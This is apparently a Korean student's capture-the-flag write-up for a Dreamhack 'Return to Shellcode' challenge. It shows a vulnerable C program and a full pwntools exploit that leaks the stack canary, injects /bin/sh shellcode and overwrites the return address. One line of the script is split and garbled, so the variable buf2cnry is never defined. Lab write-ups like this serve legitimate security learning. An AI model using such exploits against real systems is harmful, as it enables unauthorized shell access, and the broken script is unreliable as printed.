# Exploit Tech: Return to Shellcode

**r2s.c 파일**

```c
// Name: r2s.c
// Compile: gcc -o r2s r2s.c -zexecstack

#include <stdio.h>
#include <unistd.h>

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

int main() {
  char buf[0x50];

  init();

  printf("Address of the buf: %p\n", buf);
  printf("Distance between buf and $rbp: %ld\n",
         (char*)__builtin_frame_address(0) - buf);

  printf("[1] Leak the canary\n");
  printf("Input: ");
  fflush(stdout);

  read(0, buf, 0x100);
  printf("Your input is '%s'\n", buf);

  puts("[2] Overwrite the return address");
  printf("Input: ");
  fflush(stdout);
  gets(buf);

  return 0;
}
```

처음 보이는게 

```c
int main() {
  char buf[0x50];
	...
	read(0, buf, 0x100);
	...
	gets(buf);
```

buf의 크기보다 더 큰 값을 read하고 있다

buf에 bin/sh 로 가는 셀코드를 넣고 50바이트에 맞춰서 다른값을 넣고

카나리값을 덮어씌운뒤

리턴 주소를 buf 주소로 바꿔두면 될 것 같다

![image](https://github.com/user-attachments/assets/3290865b-7d63-42b5-982f-18df3de339cf)

우선 실행시켜보면 buf 주소와$rbp와 버퍼사이에 

96바이트 크기가 할당되어있다는 걸 알 수 있다  

<br>
(틀린답임 뒤에 정정된 내용이 나옴)

80바이트는 buf  
8바이트는 카나리   
8바이트는 리턴 주소   
가 있을 것이므로 첫번째 입력에서 buf의 카나리값을 얻고 두번째 입력에서 buf의 카나리값을 덮어씌우기로 한다
(지금부턴 맞는 말)  

혼자서 풀어보다가  
카나리를 어떻게 받는지 잘모르겠어서 강의록을 보고 풀었는데

checksec을 통해 보호기법을 알수있다는것과

 생각보다 긴 코드가 나와있었다

```python
#!/usr/bin/env python3
# Name: r2s.py
from pwn import *

def slog(n, m): return success(': '.join([n, hex(m)]))

p = remote('host3.dreamhack.games',21102)

context.arch = "amd64"

# get information about buf
p.recvuntil(b"buf: ")
buf = int(p.recvline()[:-1], 16)
print("Address of buf : ", hex(buf))

p.recvuntil(b"$rbp: ")
buf2sfp = int(p.recvline())
buf2
cnry = buf2sfp - 8

print("buf <=> sfp : ", buf2sfp) # distance
print("buf <=> canary : ", buf2cnry) # distance

payload = b'a' * (buf2cnry + 1) # (+1) because of the first null-byte

p.sendafter(b"Input:", payload)
p.recvuntil(payload)
cnry = u64(b"\x00" + p.recvn(7))
print("Canry : ", cnry)

sh = asm(shellcraft.sh())
payload = sh.ljust(buf2cnry, b"a") + p64(cnry) + b"b" * 0x8 + p64(buf)

# gets() receives input until "\n" is received
p.sendlineafter(b"Input:", payload)

p.interactive()
```

buf 의 주소를 받고

rbp와의 거리도 받고

buf2sfp에는 buf와 sfp와의 거리를

buf2cnry에는 buf와 cnry와의 거리를 넣어던뒤

페이로드에 buf2cnry 에 1을 더한 쓰레기값을 넣는다 (1바이트는 널문자니까)

그러면 원래 출력되야할 기존 입력값이 아닌 카나리 값이 출력되는데 그 값을 받아서 다음 입력 때 사용하는 것이다 (둘 다 buf 에 넣는거니까 카나리값이 동일)

bin/sh 로 접근하는 셀코드를 만들어주고 페이로드에 넣어준다

그리고 위에 잘못 이햐한 부분이 있는데

buf와 sfp와 거리가 96바이트이고

buf와 canary와 거리가 88바이트인걸 봐선 

80바이트 크기의 buf

8바이트 카나리

8바이트 sfp

8바이트 리턴주소

이렇게 구성되어있는거같다

코드를 실행해보면
![image](https://github.com/user-attachments/assets/d1f67e23-72a5-4f7c-a447-e03fd353c058)

잘 나온다.
